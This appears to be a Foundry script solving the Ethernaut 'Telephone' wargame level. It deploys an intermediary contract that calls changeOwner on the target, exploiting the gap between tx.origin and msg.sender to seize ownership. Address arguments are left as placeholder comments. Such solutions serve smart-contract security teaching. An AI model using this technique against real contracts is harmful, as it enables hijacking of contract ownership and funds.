pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";

interface IPhone
{
    function changeOwner(address _owner) external;
}

contract Answer
{
    constructor()
    {
        IPhone target = IPhone(/* instance address */);
        target.changeOwner(/* your wallet address */);
    }
}

contract callTelephone
{
    constructor()
    {
        Answer answer = new Answer();
    }
}

contract RunThis is Script
{
    function run() external
    {
        vm.startBroadcast();

        callTelephone phone = new callTelephone();

        vm.stopBroadcast();
    }
}
